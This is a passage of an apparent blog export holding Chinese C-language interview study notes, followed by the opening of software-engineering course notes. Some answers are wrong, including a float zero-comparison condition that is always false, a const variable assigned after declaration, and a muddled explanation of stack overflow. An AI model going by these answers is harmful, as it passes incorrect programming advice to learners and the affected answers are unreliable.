，-56.79，0.0<br>字符常量：如‘？’<br>转义字符：如‘\n’<br>字符串常量：如“boy”<br>符号常量：#define PI 3.1416</li></ul></li><li><p><strong>变量</strong>：在程序运行期间，变量的值是可以改变的</p><ul><li>变量必须先定义，后使用；<br>定义变量时指定该变量的名字和类型；<br>变量名和变量值是两个不同的概念；<br>变量名实际上是以一个名字代表的一个存储地址；<br>从变量中取值，实际上是通过变量名找到相应的内存地址，从该存储单元中读取数据。</li></ul></li><li><p><strong>常变量</strong>：const int a&#x3D;3；const就是用来限定一个变量不允许被改变的。</p></li></ul><h3 id="C-语言中十进制、八进制和十六进制整常量是如何表示的"><a href="#C-语言中十进制、八进制和十六进制整常量是如何表示的" class="headerlink" title="C 语言中十进制、八进制和十六进制整常量是如何表示的"></a>C 语言中十进制、八进制和十六进制整常量是如何表示的</h3><ul><li>整型常量即整常数。C 整常数可用以下三种形式表示：</li><li>① 十进制整数；</li><li>② 八进制整数：以数字 0 开头的数是八进制数，如 0123 表示八进制数 123；</li><li>十六进制整数：以 0x 开头的数是十六进制数。如 0x123，代表十六进制数 123；</li></ul><h3 id="C-语言中为什么规定对所用到的变量“先定义，后使用”，这样做有什么好处"><a href="#C-语言中为什么规定对所用到的变量“先定义，后使用”，这样做有什么好处" class="headerlink" title="C 语言中为什么规定对所用到的变量“先定义，后使用”，这样做有什么好处"></a>C 语言中为什么规定对所用到的变量“先定义，后使用”，这样做有什么好处</h3><ul><li>（1）便于纠错；</li><li>（2）便于编译系统为变量分配存储空间；</li><li>（3）运算合法性检查；</li></ul><h3 id="简述一下标识符"><a href="#简述一下标识符" class="headerlink" title="简述一下标识符"></a>简述一下标识符</h3><ul><li><p><strong>标识符</strong>：一个对象的名字</p><ul><li>C 语言规定标识符只能由字母、数字和下划线3种字符组成，且第一个字符必须为字母或下划线。<br>合法的标识符：如sum，average，_total，Class，day，BASIC，li_ling<br>不合法的标识符：如M.D.John，$123，#33，3D64，a&gt;b</li></ul></li></ul><h3 id="C-语句的分类"><a href="#C-语句的分类" class="headerlink" title="C 语句的分类"></a>C 语句的分类</h3><p>（1）控制语句：if、switch、for、while、do…while、continue、break、return、goto等<br>（2）函数调用语句<br>（3）表达式语句<br>（4）空语句<br>（5）复合语句<br>在C程序中，最常用的语句是：<br>赋值语句<br>输入输出语句<br>其中最基本的是赋值语句</p><h2 id="预处理"><a href="#预处理" class="headerlink" title="预处理"></a>预处理</h2><h3 id="什么是预编译"><a href="#什么是预编译" class="headerlink" title="什么是预编译"></a>什么是预编译</h3><p>预编译又称预处理，是整个编译过程最先做的工作，即程序执行前的一些预处理工作。主要处理 # 开头的指令。如拷贝 #include 包含的文件代码、替换 #define 定义的宏、条件编译 #if 等。</p><h3 id="何时需要预编译"><a href="#何时需要预编译" class="headerlink" title="何时需要预编译"></a>何时需要预编译</h3><ul><li>（1）总是使用不经常改动的大型代码体</li><li>（2）程序由多个模块组成，所有模块都使用一组标准的包含文件和相同的编译选项。在这种情况下，可以将所有包含文件预编译为一个预编译头。</li></ul><h3 id="写一个-“标准”-宏，这个宏输入两个参数并返回较小的一个"><a href="#写一个-“标准”-宏，这个宏输入两个参数并返回较小的一个" class="headerlink" title="写一个 “标准” 宏，这个宏输入两个参数并返回较小的一个"></a>写一个 “标准” 宏，这个宏输入两个参数并返回较小的一个</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">#define MIN(x, y) ((x)&lt;(y)?(x):(y)) //结尾没有;</span><br></pre></td></tr></table></figure><h3 id="与-的作用"><a href="#与-的作用" class="headerlink" title="# 与 ## 的作用"></a><code>#</code> 与 <code>##</code> 的作用</h3><p><code>#</code> 是把宏参数转化为字符串的运算符，<code>##</code> 是把两个宏参数连接的运算符。</p><p>例如：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">#define STR(arg) #arg 则宏 STR(hello)展开时为”hello”</span><br><span class="line">#define NAME(y) name_y 则宏 NAME(1)展开时仍为 name_y</span><br><span class="line">#define NAME(y) name_##y 则宏 NAME(1)展开为 name_1</span><br><span class="line">#define DECLARE(name, type) typename##_##type##_type，</span><br><span class="line">则宏 DECLARE(val, int)展开为 int val_int_type</span><br></pre></td></tr></table></figure><h3 id="如何避免头文件被重复包含"><a href="#如何避免头文件被重复包含" class="headerlink" title="如何避免头文件被重复包含"></a>如何避免头文件被重复包含</h3><p>例如，为避免头文件 my_head.h 被重复包含，可在其中使用条件编译：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">#ifndef _MY_HEAD_H</span><br><span class="line"></span><br><span class="line">#define _MY_HEAD_H /*空宏*/</span><br><span class="line"></span><br><span class="line">/*其他语句*/</span><br><span class="line"></span><br><span class="line">#endif</span><br></pre></td></tr></table></figure><h2 id="关键字"><a href="#关键字" class="headerlink" title="关键字"></a>关键字</h2><h3 id="static-关键字有什么用途呢"><a href="#static-关键字有什么用途呢" class="headerlink" title="static 关键字有什么用途呢"></a>static 关键字有什么用途呢</h3><p>static 的用途主要有两个，一是用于修饰存储类型使之成为静态存储类型，二是用于修饰链接属性使之成为内部链接属性。</p><ul><li>（1）<strong>静态存储类型</strong></li></ul><p>在函数内定义的静态局部变量，该变量存在内存的静态区，所以即使该函数运行结束，静态变量的值不会被销毁，函数下次运行时能仍用到这个值。</p><p>在函数外定义的静态变量——静态全局变量，该变量的作用域只能在定义该变量的文件中，不能被其他文件通过 extern 引用。</p><ul><li>（2）<strong>内部链接属性</strong></li></ul><p>静态函数只能在声明它的源文件中使用。</p><h3 id="const-关键字的作用"><a href="#const-关键字的作用" class="headerlink" title="const 关键字的作用"></a>const 关键字的作用</h3><ul><li>（1）声明常态量，使得指定的变量不能被修改</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">/*a的值一直为5，不能被改变*/</span><br><span class="line">const int a = 5;</span><br><span class="line">/*b的值被赋值为10后，不能被改变*/</span><br><span class="line">const int b; b = 10;</span><br><span class="line">/*ptr为指向整型常量的指针，ptr的值可以修改，但不能修改其所指向的值*/</span><br><span class="line">const int *ptr; </span><br><span class="line">/*ptr为指向整型的常量指针，ptr的值不能修改，但可以修改其所指向的值*/</span><br><span class="line">int *const ptr;</span><br><span class="line">/*ptr为指向整型常量的常量指针，ptr及其指向的值都不能修改*/</span><br><span class="line">const int *const ptr;</span><br></pre></td></tr></table></figure><ul><li>（2）修饰函数形参，使得形参在函数内不能被修改，表示输入参数</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">int fun(const int a);或int fun(const char *str);</span><br></pre></td></tr></table></figure><ul><li>（3）修饰函数返回值，使得函数的返回值不能被修改</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">const char *getstr(void);使用：const *str= getstr();</span><br><span class="line">const int getint(void); 使用：const int a =getint();</span><br></pre></td></tr></table></figure><h3 id="volatile-关键字的作用"><a href="#volatile-关键字的作用" class="headerlink" title="volatile 关键字的作用"></a>volatile 关键字的作用</h3><p>volatile 指定的关键字可能被系统、硬件、进程&#x2F;线程改变，强制编译器每次从内存中取得该变量的值，而不是从被优化后的寄存器中读取。例子:硬件时钟;多线程中被多个任务共享的变量等。</p><h3 id="extern-关键字的作用"><a href="#extern-关键字的作用" class="headerlink" title="extern 关键字的作用"></a>extern 关键字的作用</h3><ul><li>（1）用于修饰变量或函数，表明该变量或函数都是在别的文件中定义的，提示编译器在其他文件中寻找定义。</li><li>（2）用于extern “c“：<strong>为了能够正确实现C++代码调用其他C语言代码</strong></li></ul><h3 id="sizeof-关键字的作用"><a href="#sizeof-关键字的作用" class="headerlink" title="sizeof 关键字的作用"></a>sizeof 关键字的作用</h3><p>sizeof 是在编译阶段处理，且不能被编译为机器码。sizeof 的结果等于对象或类型所占的内存字节数。sizeof 的返回值类型为 size_t。</p><h3 id="简述-const-的作用，const-与-define-相比，有何特点"><a href="#简述-const-的作用，const-与-define-相比，有何特点" class="headerlink" title="简述 const 的作用，const 与 #define 相比，有何特点"></a>简述 const 的作用，const 与 #define 相比，有何特点</h3><p>const 只读变量，有类型，而 #define 是定义宏，没有类型。</p><h2 id="结构体"><a href="#结构体" class="headerlink" title="结构体"></a>结构体</h2><h3 id="结构体的赋值"><a href="#结构体的赋值" class="headerlink" title="结构体的赋值"></a>结构体的赋值</h3><p>C 语言中对结构体变量的赋值或者在初始化或者在定义后按字段赋值。</p><h3 id="结构体变量如何比较"><a href="#结构体变量如何比较" class="headerlink" title="结构体变量如何比较"></a>结构体变量如何比较</h3><p>虽然结构体变量之间可以通过&#x3D;直接赋值，但不同通过比较符如 &#x3D;&#x3D; 来比较，因为比较符只作用于基本数据类型。这个时候，只能通过 int memcmp(const void <em>s1, const void</em> s2, size_t n); 来进行内存上的比较。</p><h3 id="结构体位域"><a href="#结构体位域" class="headerlink" title="结构体位域"></a>结构体位域</h3><p>位域是一个或多个位的字段，不同长度的字段（如声明为unsigned int类型）存储于一个或多个其所声明类型的变量中（如整型变量中）。</p><p>位域的类型：可以是char、short、int，多数使用int，使用时最好带上signed或unsigned</p><p>位域的特点：字段可以不命名，如unsigned int :1;可用来填充；unsigned int :0; 0宽度用来强制在下一个整型（因此处是unsigned int类型）边界上对齐。</p><p><strong>位域的好处：</strong></p><p>1.有些信息在存储时，并不需要占用一个完整的字节， 而只需占几个或一个二进制位。例如在存放一个开关量时，只有0和1 两种状态，用一位二进位即可。这样节省存储空间，而且处理简便。这样就可以把几个不同的对象用一个字节的二进制位域来表示。</p><p>2.可以很方便的利用位域把一个变量给按位分解。比如只需要4个大小在0到3的随即数，就可以只rand()一次，然后每个位域取2个二进制位即可，省时省空间。</p><p><strong>位域的缺点：</strong></p><p>不同系统对位域的处理可能有不同的结果，如位段成员在内存中是从左向右分配的还是从右向左分配的，所以位域的使用不利于程序的可移植性。</p><h3 id="结构体成员数组大小为-0"><a href="#结构体成员数组大小为-0" class="headerlink" title="结构体成员数组大小为 0"></a>结构体成员数组大小为 0</h3><p>结构体数组成员的大小为 0，是 GNU C 的一个特性。好处是可以在结构体中分配不定长的大小。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">typedef struct st</span><br><span class="line">&#123;</span><br><span class="line">    inta;</span><br><span class="line">    int b;</span><br><span class="line">    char c[0];</span><br><span class="line">&#125;st_t;</span><br><span class="line">sizeof(st_t)等于8，即char c[0]的大小为0.</span><br><span class="line">#define SIZE 100</span><br><span class="line">st_t *s = (st_t *)malloc(sizeof(st_t) + SIZE);</span><br></pre></td></tr></table></figure><h3 id="请问C-的类和C里面的struct有什么区别"><a href="#请问C-的类和C里面的struct有什么区别" class="headerlink" title="请问C++的类和C里面的struct有什么区别"></a>请问C++的类和C里面的struct有什么区别</h3><p>c++中的类具有成员保护功能，并且具有继承，多态这类特点，而c里的struct没有。c里面的struct没有成员函数,不能继承,派生等等.</p><h2 id="字符串"><a href="#字符串" class="headerlink" title="字符串"></a>字符串</h2><h3 id="字符常量与字符串常量有什么区别"><a href="#字符常量与字符串常量有什么区别" class="headerlink" title="字符常量与字符串常量有什么区别"></a>字符常量与字符串常量有什么区别</h3><p>字符常量就是一个字符，用单引号括起来，占一个字节；而字符串常量是由若干个字符组合而成，用双引号括起来，存储时自动在后面加“\0”，即使同样是一个字符，字符串常量后面还要加一个“\0”。</p><h2 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h2><h3 id="什么是函数"><a href="#什么是函数" class="headerlink" title="什么是函数"></a>什么是函数</h3><p>函数是指功能。每一个函数用来实现一个特定的功能，函数的名字反映其代表的功能。如下图是一个程序中函数调用的示意图。</p><p><img src="https://cos.gjcloak.xyz/NoteBook/20200514170433.png" alt="image-20200514170356789" title="image-20200514170356789"></p><h3 id="函数的分类"><a href="#函数的分类" class="headerlink" title="函数的分类"></a>函数的分类</h3><p>（1）从用户使用的角度划分</p><ul><li>① 库函数：库函数是由系统提供的，用户不必自己定义，可直接使用它们。</li><li>② 用户自己定义的函数</li></ul><p>（2）函数形式的划分</p><ul><li>① 无参函数：在调用无参函数时，主调函数不向被调用函数传递数据。</li><li>② 有参函数：主调函数在调用被调用函数时，通过参数向被调用函数传递数据。</li></ul><h3 id="函数调用时的数据传递"><a href="#函数调用时的数据传递" class="headerlink" title="函数调用时的数据传递"></a>函数调用时的数据传递</h3><p>定义函数时括号中的参数为形参，调用该括号中的参数为实参，在调用函数过程中发生的实参与形参间的数据传递，常称为“虚实结合”。实参向形参的数据传递是“值传递”，单向传递，只能由实参传给形参，而不能由形参传给实参。</p><h3 id="函数参数入栈顺序"><a href="#函数参数入栈顺序" class="headerlink" title="函数参数入栈顺序"></a>函数参数入栈顺序</h3><p>C 语言函数参数入栈顺序是从右向左的，这是由编译器决定的，更具体的说是函数调用约定决定了参数的入栈顺序。C 语言采用是函数调用约定是 __cdecl 的，所以对于函数的声明，完整的形式是：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">int __cdecl func(int a, int b);</span><br></pre></td></tr></table></figure><h3 id="inline-内联函数"><a href="#inline-内联函数" class="headerlink" title="inline 内联函数"></a>inline 内联函数</h3><p>inline 关键字仅仅是建议编译器做内联展开处理，即是将函数直接嵌入调用程序的主体，省去了调用&#x2F;返回指令。</p><h3 id="什么函数不能声明为虚函数"><a href="#什么函数不能声明为虚函数" class="headerlink" title="什么函数不能声明为虚函数"></a>什么函数不能声明为虚函数</h3><p>constructor</p><h2 id="指针"><a href="#指针" class="headerlink" title="指针"></a>指针</h2><h3 id="指针和指针变量"><a href="#指针和指针变量" class="headerlink" title="指针和指针变量"></a>指针和指针变量</h3><p>一个变量的地址称为该变量的指针。如果有一个变量专门用来存放另一变量的地址（即指针），则称为指针变量。指针变量是指地址变量，用来存放地址，指针变量的值是地址（即指针）。</p><h3 id="引用和指针有什么区别"><a href="#引用和指针有什么区别" class="headerlink" title="引用和指针有什么区别"></a>引用和指针有什么区别</h3><p>1 引用必须被初始化，指针不必</p><p>2 引用初始化以后不能被改变，指针可以改变所指的对象</p><p>3 不存在指向空值的引用，但是存在指向空值的指针</p><h3 id="在嵌入式开发中，为什么能通过-C-语言直接操作硬件"><a href="#在嵌入式开发中，为什么能通过-C-语言直接操作硬件" class="headerlink" title="在嵌入式开发中，为什么能通过 C 语言直接操作硬件"></a>在嵌入式开发中，为什么能通过 C 语言直接操作硬件</h3><p>因为 C 有指针，它是 C 语言的灵魂，它可以直接访问内存。</p><h3 id="链表的作用"><a href="#链表的作用" class="headerlink" title="链表的作用"></a>链表的作用</h3><p>{cat_tips_E}这是上一个问题的延申，一般会举一堆例子来说明它的作用，但这都不是重点，没有抓住主要矛盾{&#x2F;cat_tips_E}</p><p>链表用于内存管理，链表节点中的指针域可以将不连续的内存彼此关联起来，实现内存的动态管理。</p><h3 id="什么变量不能用指针指向"><a href="#什么变量不能用指针指向" class="headerlink" title="什么变量不能用指针指向"></a>什么变量不能用指针指向</h3><p>寄存器变量（register 修饰），因为这个变量会优先选择存放到 CPU 寄存器中，而指针只能指向内存的任务区域，但不能指向寄存器。 </p><h3 id="有符号字符型和无符号字符型变量的最大值和最小值分别是多少（十六进制多少），为什么"><a href="#有符号字符型和无符号字符型变量的最大值和最小值分别是多少（十六进制多少），为什么" class="headerlink" title="有符号字符型和无符号字符型变量的最大值和最小值分别是多少（十六进制多少），为什么"></a>有符号字符型和无符号字符型变量的最大值和最小值分别是多少（十六进制多少），为什么</h3><p>有符号（-128—127，-0X80—0X7F），无符号（0-255,0X00—0XFF）。</p><h3 id="描述实时系统的基本特性"><a href="#描述实时系统的基本特性" class="headerlink" title="描述实时系统的基本特性"></a>描述实时系统的基本特性</h3><p>在特定时间内完成特定任务，实时性和可靠性</p><h3 id="全局变量和局部变量在内存中是否有区别"><a href="#全局变量和局部变量在内存中是否有区别" class="headerlink" title="全局变量和局部变量在内存中是否有区别"></a>全局变量和局部变量在内存中是否有区别</h3><p>有区别，全局变量存储在静态数据库中，局部变量在堆栈</p><h2 id="内存分配回收"><a href="#内存分配回收" class="headerlink" title="内存分配回收"></a>内存分配回收</h2><h3 id="malloc-free-与-new-delete-的区别"><a href="#malloc-free-与-new-delete-的区别" class="headerlink" title="malloc&#x2F;free 与 new&#x2F;delete 的区别"></a>malloc&#x2F;free 与 new&#x2F;delete 的区别</h3><ol><li><p>malloc与free是C&#x2F;C++语言的标准库函数，new&#x2F;delete是C++的运算符。它们都可用于申请动态内存和释放内存。</p></li><li><p>对于非内部数据类型的对象而言，光用maloc&#x2F;free无法满足动态对象的要求。对象在创建的同时要自动执行构造函数，对象在消亡之前要自动执行析构函数。由于malloc&#x2F;free是库函数而不是运算符，不在编译器控制权限之内，不能够把执行构造函数和析构函数的任务强加于malloc&#x2F;free。因此C++语言需要一个能完成动态内存分配和初始化工作的运算符new，以及一个能完成清理与释放内存工作的运算符delete。注意new&#x2F;delete不是库函数。</p></li></ol><p>我们不要企图用malloc&#x2F;free来完成动态对象的内存管理，应该用new&#x2F;delete。由于内部数据类型的“对象”没有构造与析构的过程，对它们而言malloc&#x2F;free和new&#x2F;delete是等价的。</p><ol start="3"><li>既然new&#x2F;delete的功能完全覆盖了malloc&#x2F;free，为什么C++不把malloc&#x2F;free淘汰出局呢？这是因为C++程序经常要调用C函数，而C程序只能用malloc&#x2F;free管理动态内存。</li></ol><p>如果用free释放“new创建的动态对象”，那么该对象因无法执行析构函数而可能导致程序出错。如果用delete释放“malloc申请的动态内存”，结果也会导致程序出错，但是该程序的可读性很差。所以new&#x2F;delete必须配对使用，malloc&#x2F;free也一样。</p><h3 id="malloc-0-返回值"><a href="#malloc-0-返回值" class="headerlink" title="malloc(0) 返回值"></a>malloc(0) 返回值</h3><p>如果请求的长度为0，则标准C语言函数malloc返回一个null指针或不能用于访问对象的非null指针，该指针能被free安全使用。</p><h3 id="动态申请数据存在于哪里"><a href="#动态申请数据存在于哪里" class="headerlink" title="动态申请数据存在于哪里"></a>动态申请数据存在于哪里</h3><p>堆中</p><h3 id="堆栈溢出一般是由什么原因导致的"><a href="#堆栈溢出一般是由什么原因导致的" class="headerlink" title="堆栈溢出一般是由什么原因导致的"></a>堆栈溢出一般是由什么原因导致的</h3><p>没有回收垃圾资源</p><h2 id="文件"><a href="#文件" class="headerlink" title="文件"></a>文件</h2><h3 id="什么是文件"><a href="#什么是文件" class="headerlink" title="什么是文件"></a>什么是文件</h3><p>文件”一般指存储在外部介质上数据的集合，一批数据是以文件的形式存放在外部介质（如磁盘）上的。</p><h3 id="文件的分类"><a href="#文件的分类" class="headerlink" title="文件的分类"></a>文件的分类</h3><ul><li>按存储内容分类有：<br>①程序文件<br>这种文件的内容是程序代码，包括源程序文件（后缀为.c）、目标文件（后缀为.obj）、可执行文件（后缀为.exe）等。<br>②数据文件<br>文件的内容不是程序，而是供程序运行时读写的数据。</li><li>根据文件的组织形式，文件可以分为ASCII文件和二进制文件。</li></ul><h3 id="什么是数据流和流式文件"><a href="#什么是数据流和流式文件" class="headerlink" title="什么是数据流和流式文件"></a>什么是数据流和流式文件</h3><p>输入输出是数据传送的过程，常将输入输出形象地称为流（stream），即数据流，通常为字符流或字节（内容为二进制数据）流。<br>流式文件的存取是以字符（字节）为单位的，其输入输出数据流的开始和结束仅受程序控制而不受物理符号（如回车换行符）控制。</p><h3 id="写出在-C-程序中使用文件的操作步骤"><a href="#写出在-C-程序中使用文件的操作步骤" class="headerlink" title="写出在 C 程序中使用文件的操作步骤"></a>写出在 C 程序中使用文件的操作步骤</h3><p>对文件的操作的步骤：先打开，后读写，最后关闭。</p><h2 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h2><h3 id="写出-float-x-与零值比较的-if-语句"><a href="#写出-float-x-与零值比较的-if-语句" class="headerlink" title="写出 float x 与零值比较的 if 语句"></a>写出 float x 与零值比较的 if 语句</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">if (x &gt; 0.000001 &amp;&amp; x &lt; -0.000001)</span><br></pre></td></tr></table></figure><h3 id="不能做-switch-的参数类型是"><a href="#不能做-switch-的参数类型是" class="headerlink" title="不能做 switch() 的参数类型是"></a>不能做 switch() 的参数类型是</h3><p>实型</p><h3 id="do-…-while-和-while-…-do-有什么区别"><a href="#do-…-while-和-while-…-do-有什么区别" class="headerlink" title="do … while 和 while … do 有什么区别"></a>do … while 和 while … do 有什么区别</h3><p>前一个循环一遍再判断，后一个判断以后再循环</p><h3 id="ASSERT-的作用"><a href="#ASSERT-的作用" class="headerlink" title="ASSERT() 的作用"></a>ASSERT() 的作用</h3><p>ASSERT() 是一个调试程序时经常使用的宏，在程序运行时它计算括号内的表达式，如果表达式为FALSE (0), 程序将报告错误，并终止执行。如果表达式不为0，则继续执行后面的语句。这个宏通常原来判断程序中是否出现了明显非法的数据，如果出现了终止程序以免导致严重后果，同时也便于查找错误。例如，变量n在程序中不应该为0，如果为0可能导致错误，你可以这样写程序：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ASSERT( n != 0);</span><br><span class="line">k = 10/ n;</span><br></pre></td></tr></table></figure><p>ASSERT只有在Debug版本中才有效，如果编译为Release版本则被忽略。</p><p>assert()的功能类似，它是ANSI C标准中规定的函数，它与ASSERT的一个重要区别是可以用在Release版本中。</p><h3 id="system-“pause”-的作用"><a href="#system-“pause”-的作用" class="headerlink" title="system(“pause”); 的作用"></a>system(“pause”); 的作用</h3><p>系统的暂停程序，按任意键继续，屏幕会打印，”按任意键继续。。。。。”省去了使用getchar（）；</p><h3 id="选择语句和循环语句对条件的判断的标准是什么"><a href="#选择语句和循环语句对条件的判断的标准是什么" class="headerlink" title="选择语句和循环语句对条件的判断的标准是什么"></a>选择语句和循环语句对条件的判断的标准是什么</h3><p>{cat_tips_E}即何值为真、何值为假{&#x2F;cat_tips_E}</p><p>非0为真，0位假。</p>]]></content>
      
      
      <categories>
          
          <category> 笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 面试题 </tag>
            
            <tag> C语言 </tag>
            
            <tag> 学习笔记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>软件工程学习笔记</title>
      <link href="/47.html"/>
      <url>/47.html</url>
      
        <content type="html"><![CDATA[<h2 id="第一章-软件工程概论"><a href="#第一章-软件工程概论" class="headerlink" title="第一章 软件工程概论"></a>第一章 软件工程概论</h2><h3 id="软件的定义及特点"><a href="#软件的定义及特点" class="headerlink" title="软件的定义及特点"></a>软件的定义及特点</h3><h4 id="软件的定义"><a href="#软件的定义" class="headerlink" title="软件的定义"></a>软件的定义</h4><p>软件：计算机系统中的程序及其文档</p><ul><li><strong>程序</strong>是计算任务的处理对象和处理规则的描述</li><li><strong>文档</strong>是为了便于了解程序所需的阐明性资料</li></ul><h4 id="软件的特点"><a href="#软件的特点" class="headerlink" title="软件的特点"></a>软件的特点</h4><ul><li><p>（1）软件是无形的、不可见的逻辑实体</p><ul><li>它的正确与否，一直到程序在机器上运行才能知道</li><li>这就给设计、生产和管理带来许多困难</li></ul></li><li><p>（2）软件是设计开发的，而不是生产制造的</p></li><li><p>（3）软件在使用过程中没有磨损、老化的问题</p></li><li><p>（4）软件是定制开发的</p><ul><li>虽然整个工业向着基于构件的构造模式发展</li><li>然而大多数软件仍是根据实际的顾客需求定制的</li></ul></li><li><p>（5）软件是复杂的</p><ul><li>软件涉及人类社会的各行各业</li><li>软件开发常常涉及其他领域的专业知识。这对软件工程师提出了很高的要求。</li></ul></li><li><p>（6）软件的开发成本高</p></li><li><p>（7）软件易于复制</p></li><li><p>（8）软件质量要求较高</p></li><li><p>（9）软件的开发与运行都离不开相关的计算机系统环境</p></li><li><p>（10）软件开发工作牵涉到很多社会因素</p><ul><li>如机构设置、体制和管理方式，以及人们的观念和心理</li></ul></li></ul><h4 id="软件的种类："><a href="#软件的种类：" class="headerlink" title="软件的种类："></a>软件的种类：</h4><p>按照软件的功能划分，软件一般可以分为系统软件、支撑软件和应用软件三类。</p><h4 id="说明："><a href="#说明：" class="headerlink" title="说明："></a>说明：</h4><p>软件是软件工程的研究对象，也是软件工程的产品形态与客观存在。</p><p>工程是将理论和知识应用于实践的科学，其目的是经济有效地解决实际问题。</p><h3 id="软件工程的起源和概念"><a href="#软件工程的起源和概念" class="headerlink" title="软件工程的起源和概念"></a>软件工程的起源和概念</h3><h4 id="软件工程的起源"><a href="#软件工程的起源" class="headerlink" title="软件工程的起源"></a>软件工程的起源</h4><ul><li>1946 年计算机刚诞生时，人们采用机器码编制程序（机器码指令为了驱动计算机硬件工作），没有独立的软件的概念</li><li>1947 年，冯 · 诺依曼首次提出用流程图描述计算机的运行过程，使人们认识到程序设计师完全不同于硬件研制的另一项工作，从此，软件的开发和研究才逐渐开始独立地进行。</li><li>现在，在信息产业中，微电子是基础，计算机和网络是载体，软件是核心。</li></ul><h4 id="软件开发的三个阶段"><a href="#软件开发的三个阶段" class="headerlink" title="软件开发的三个阶段"></a>软件开发的三个阶段</h4><ul><li><p>个人程序时期（1947 年 - 1950 年代末）</p><ul><li>在这个时期，程序员使用的开发语言主要是机器语言和汇编语言，负责从程序的开发、运行和维护的全过程，这是一种私人化的软件环境。</li></ul></li><li><p>软件作坊时期（1960 年代初 - 1960 年代末）</p><ul><li>多人分工合作，共同完成一个程序的编制，需要对项目开发进行管理，即所谓 “作坊式生产方式”</li><li>这一时期，出现了 FORTRAN、COBOL 等高级程序设计语言</li></ul></li><li><p>软件工程时期（1970 年代初至今）</p><ul><li>随着计算机应用领域的进一步扩大，软件的规模和复杂性也在不断增加</li><li>出现了 ”软件危机“</li></ul></li></ul><h4 id="软件危机的现象："><a href="#软件危机的现象：" class="headerlink" title="软件危机的现象："></a>软件危机的现象：</h4><ul><li>软件质量差，可靠性难以保证</li><li>成本难以控制，很少有在预算内完成的</li><li>开发进度难以把握，周期拖得很长</li><li>可维护性较差，维护人员和费用不断增加</li></ul><p><img src="https://cos.gjcloak.xyz/file/image-1652659332419.png" alt="image-1652659332419" title="image-1652659332419"></p><p>为解决软件危机，提出了软件工程的概念！</p><p>其目的是倡导以工程的原理、原则和方法进行软件开发，以解决软件危机。</p><h4 id="软件工程的定义"><a href="#软件工程的定义" class="headerlink" title="软件工程的定义"></a>软件工程的定义</h4><p><strong>IEEE</strong>（IEEE93）中的软件工程定义：</p><ul><li>将系统化的、规范的、可量化的方法应用到软件的开发、运行及维护中，即将工程化方法应用于软件。</li></ul><h3 id="软件工程框架"><a href="#软件工程框架" class="headerlink" title="软件工程框架"></a>软件工程框架</h3><p>软件工程可定义为三元组：&lt;目标，原则，活动&gt;</p><ul><li>（1）给出了软件所涉及软件工程的工程要素</li><li>（2）给出了各要素之间的关系</li><li>（3）给出了软件工程学科所研究的主要内容</li></ul><h4 id="软件工程的目标"><a href="#软件工程的目标" class="headerlink" title="软件工程的目标"></a>软件工程的目标</h4><p>软件工程的目标是：生产具有正确性、可用性以及开销合宜的产品</p><ul><li>正确性：指软件产品达到预期功能的程度</li><li>可用性：指软件基本结构、实现及文档为用户可用的程度</li><li>开销合宜：指软件开发、运行的整个开销满足用户要求的程度</li></ul><h4 id="软件工程的活动"><a href="#软件工程的活动" class="headerlink" title="软件工程的活动"></a>软件工程的活动</h4><p>指生产一个最终满足需求且达到工程目标的软件产品所需要的步骤，主要包括<strong>需求</strong>、<strong>设计</strong>、<strong>实现</strong>、<strong>确认</strong>和<strong>支持</strong>等活动。</p><p>1 需求</p><ul><li><p>定义问题，即建立系统模型</p></li><li><p>主要任务包括：</p><ul><li>需求获取</li><li>需求定义（即定义问题）系统功能的一个正确的陈述</li><li>需求规约：系统需求规格说明</li><li>需求验证</li></ul></li></ul><p>2 设计</p><ul><li><p>设计包括总体设计（也叫概要设计）和详细设计</p></li><li><p>总体设计建立整个软件体系结构</p><ul><li>包括子系统、模块（或构件）以及相关层次的说明、每一模块（或构件）的接口定义</li></ul></li><li><p>详细设计针对总体设计结果，给出体系结构中每一模块或构件的详细描述</p><ul><li>即给出它们的数据结构说明和实现算法</li></ul></li></ul><p>3 实现</p><ul><li><p>把设计结果转换为可执行的程序代码</p></li><li><p>具体做法：</p><ul><li>（1）选择可用的模块或构件</li><li>（2）或以一种选定的语言，对每一模块或构件进行编码</li></ul></li></ul><p>4 确认</p><ul><li>确认活动贯穿于整个开发过程</li><li>实现完成后的确认，保证最终产品满足用户的需求</li><li>确认活动主要包括：</li><li>需求复审、设计复审以及程序测试，主要任务是：软件测试</li></ul><p>5 支持活动</p><ul><li>支持活动包括修改和完善</li><li>它为系统的运行提供完善性维护、纠错性维护和适应性维护</li></ul><h4 id="软件工程的原则"><a href="#软件工程的原则" class="headerlink" 